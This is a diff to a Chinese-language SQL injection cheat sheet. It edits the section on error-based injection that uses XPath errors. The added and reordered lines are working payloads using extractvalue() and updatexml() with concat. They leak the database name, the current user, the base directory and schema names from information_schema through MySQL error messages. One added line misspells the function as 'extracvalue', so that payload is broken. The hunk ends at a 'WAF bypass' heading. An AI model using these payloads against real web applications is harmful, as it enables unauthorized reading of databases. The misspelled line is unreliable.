@@ -153,9 +153,13 @@ exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取
 * xpath syntax error  
 ```extractvalue()```,```updatexml()```諸如此類函數可以對user指定xml語法做查詢語修改  
 ```sql
-?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
 ?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
+?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
+?id=1" or/and select extractvalue(rand(),concat(0x3a,@@basedir))#
 // 由於中間xml語法錯誤，會將database()結果顯示於錯誤訊息
+
+and extracvalue(rand(),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1))#
+where table_schema=0xXXXXX
 ```
 
 ### WAF bypass
